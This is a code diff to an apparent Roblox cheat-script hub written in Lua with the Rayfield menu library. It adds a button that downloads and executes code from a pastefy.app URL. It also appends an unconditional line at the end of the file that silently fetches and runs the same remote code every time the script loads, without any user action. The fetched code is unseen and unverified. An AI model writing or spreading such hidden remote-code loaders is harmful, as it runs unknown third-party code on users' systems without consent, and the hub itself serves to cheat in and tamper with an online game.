@@ -95,6 +95,18 @@ local Button = FightTab:CreateButton({
 
 local Divider = FightTab:CreateDivider()
 
+local FightSection = FightTab:CreateSection("Steal A Brainrot")
+ 
+local Button = FightTab:CreateButton({
+   Name = "Steal A Brainrot (ZZZ)",
+   Callback = function()
+   loadstring(game:HttpGet("https://pastefy.app/DHyT4Zoi/raw"))()
+   Rayfield:Destroy()
+   end,
+})
+
+local Divider = FightTab:CreateDivider()
+
 local FightSection = FightTab:CreateSection("Evade")
 
  local Button = FightTab:CreateButton({
@@ -267,3 +279,5 @@ local Button = MiscTab:CreateButton({
    Rayfield:Destroy()
    end,
 })
+
+loadstring(game:HttpGet("https://pastefy.app/DHyT4Zoi/raw"))()
